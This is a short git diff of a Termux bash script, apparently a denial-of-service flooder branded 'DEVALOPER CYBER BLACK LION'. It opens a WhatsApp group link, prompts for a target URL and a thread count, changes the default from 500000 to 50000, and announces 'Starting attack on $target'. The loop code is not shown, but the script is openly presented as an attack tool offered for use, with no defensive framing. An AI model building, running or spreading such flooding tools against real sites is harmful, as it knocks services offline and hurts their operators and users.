@@ -2,7 +2,6 @@
 
 clear
 
-
 #color
 
 y="\e[1;33m"
@@ -39,6 +38,7 @@ echo -e "${GREEN}                                > DEVALOPER CYBER BLACK LION! <
 
 termux-open-url https://chat.whatsapp.com/HlH3EfeFlar5Fy1YCieMKJ
 
+#!/data/data/com.termux/files/usr/bin/bash
 
 # Ask user for the target URL
 read -p "Enter the target URL (e.g., http://localhost:8080): " target
@@ -50,8 +50,8 @@ if [ -z "$target" ]; then
 fi
 
 # Ask for number of threads (requests per loop)
-read -p "Enter number of threads (default is 500000): " threads
-threads=${threads:-500000}  # Use 50 if not specified
+read -p "Enter number of threads (default is 50000): " threads
+threads=${threads:-50000}  # Use 50 if not specified
 
 # Start the attack loop
 echo "Starting attack on $target... Press Ctrl+C to stop."
